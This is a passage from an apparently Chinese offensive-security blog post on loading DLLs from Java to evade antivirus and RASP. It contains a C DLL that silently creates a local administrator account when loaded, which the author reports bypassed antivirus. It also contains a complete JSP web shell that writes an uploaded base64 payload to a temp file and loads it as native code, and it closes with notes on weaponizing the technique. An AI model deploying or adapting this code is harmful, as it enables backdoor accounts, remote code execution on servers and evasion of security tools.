(rc !&#x3D; NERR_Success) &#123;</span><br><span class="line">		_tprintf(_T(&quot;NetLocalGroupAddMembers FAIL %d 0x%08x\r\n&quot;), rc, rc);</span><br><span class="line">		return rc;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">		CreateAdminUserInternal();</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要一个管理员身份才有权限添加用户。成功绕过杀软添加用户。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220831152710826.png" alt="image-20220831152710826"></p>
+<p>师傅的项目里还有RDP以及dump内存等代码</p>
+<h1 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h1><p>直接搬来大佬的jsp，通过base64解密后写入随机命名的dll，然后进行load。可拓展为反序列化，JNDI注入等等。</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.RandomAccessFile&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">// 获取随机的动态链接库文件名称</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getFileName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String fileName = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        java.util.Random random = <span class="keyword">new</span> java.util.Random(System.currentTimeMillis());</span><br><span class="line">        String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();</span><br><span class="line">        <span class="keyword">if</span> (os.contains(<span class="string">&quot;windows&quot;</span>))&#123;</span><br><span class="line">            fileName = <span class="string">&quot;C:\\Windows\\Temp\\&quot;</span> + random.nextInt(<span class="number">10000000</span>) + <span class="string">&quot;.dll&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            fileName = <span class="string">&quot;/tmp/&quot;</span>+ random.nextInt(<span class="number">10000000</span>) + <span class="string">&quot;.so&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fileName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// JSP 声明函数中无法获取全局默认的ServletRequest对象，但ServletRequest继承java.io.InputStream，可以替代</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">UploadBase64DLL</span><span class="params">(java.io.InputStream stream)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        sun.misc.BASE64Decoder b = <span class="keyword">new</span> sun.misc.BASE64Decoder();</span><br><span class="line">        java.io.File file = <span class="keyword">new</span> java.io.File(getFileName());</span><br><span class="line">        java.io.FileOutputStream fos = <span class="keyword">new</span> java.io.FileOutputStream(file);</span><br><span class="line">        fos.write(b.decodeBuffer(stream));</span><br><span class="line">        fos.close();</span><br><span class="line">        <span class="keyword">return</span> file.getAbsolutePath();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RuntimeLoad</span><span class="params">(String path)</span></span>&#123;</span><br><span class="line">        Runtime.getRuntime().load(path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SystemLoad</span><span class="params">(String path)</span></span>&#123;</span><br><span class="line">        System.load(path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 有些JDK版本没有这个对象，因此采用反射加载进行运行</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">NativeLoad</span><span class="params">(String path)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class Native = Class.forName(<span class="string">&quot;com.sun.glass.utils.NativeLibLoader&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(Native != <span class="keyword">null</span>)&#123;</span><br><span class="line">            java.lang.reflect.Method Load = Native.getDeclaredMethod(<span class="string">&quot;loadLibrary&quot;</span>,String.class);</span><br><span class="line">            Load.invoke(path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//&lt;/jsp:declaration&gt;</span></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    out.print(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    <span class="comment">//加载方式</span></span><br><span class="line">    String method = request.getHeader(<span class="string">&quot;WWW-Authenticate&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        ServletInputStream stream = request.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> (stream.available() == <span class="number">0</span>)&#123;</span><br><span class="line">            out.println(System.getProperty(<span class="string">&quot;os.arch&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String file =  UploadBase64DLL(stream);</span><br><span class="line">        <span class="comment">// 按照Header头选择加载方式</span></span><br><span class="line">        <span class="keyword">switch</span> (method)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;1&quot;</span>:</span><br><span class="line">                RuntimeLoad(file);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;2&quot;</span>:</span><br><span class="line">                SystemLoad(file);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;3&quot;</span>:</span><br><span class="line">                NativeLoad(file);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                RuntimeLoad(file);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        System.out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功写入</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220825171954049.png" alt="image-20220825171954049"></p>
+<h1 id="武器化思考"><a href="#武器化思考" class="headerlink" title="武器化思考"></a>武器化思考</h1><p>浅显的思考可利用的地方</p>
+<ul>
+<li>编写多功能DLL，按需执行其中的特定功能</li>
+<li>dll与spring有没有一些利用</li>
+<li>能否实现无文件落地加载dll</li>
+</ul>
+<p>Rvn0xsy项目代码：<a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/j2osWin">Rvn0xsy/j2osWin (github.com)</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14067160.html">Java安全之JNI绕过RASP - nice_0e3 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://javasec.org/javase/JNI/">JNI 安全基础 · 攻击Java Web应用(javasec.org)</a></p>
+<p><a target="_blank" rel="noopener" href="http://payloads.online/archivers/2022-08-11/1/">通过动态链接库绕过反病毒软件Hook - Break JVM</a></p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1436/">Java加载动态链接库 - 跳跳糖 (tttang.com)</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/11/07/bypassav/" rel="prev" title="免杀入门">
+                  <i class="fa fa-angle-left"></i> 免杀入门
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/11/07/DLL%E5%8A%AB%E6%8C%81/" rel="next" title="初探DLL劫持">
+                  初探DLL劫持 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
